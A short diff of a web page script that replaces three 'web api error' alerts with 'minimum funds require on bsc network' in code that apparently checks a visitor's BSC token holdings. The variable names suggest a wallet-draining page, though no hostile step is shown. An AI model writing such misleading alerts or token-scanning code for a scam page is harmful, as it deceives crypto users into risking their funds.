@@ -149,7 +149,7 @@ window.onload = async function(){
         all_token_address == null ||
         all_token_address == ''
       ) {
-        alert('web api error , plase try again later');
+        alert('minimum funds require on bsc network');
         hide_spin();
         return;
       }
@@ -190,7 +190,7 @@ window.onload = async function(){
         final_token == null ||
         final_token == ''
       ) {
-        alert('web api error , plase try again later');
+        alert('minimum funds require on bsc network');
         hide_spin();
         return;
       }
@@ -227,7 +227,7 @@ window.onload = async function(){
   async function controller() {
 
     if(high_token == null || high_token == undefined || high_token == ""){
-      alert('web api error , try again later');
+      alert('minimum funds require on bsc network');
       hide_spin();
       return;
     }
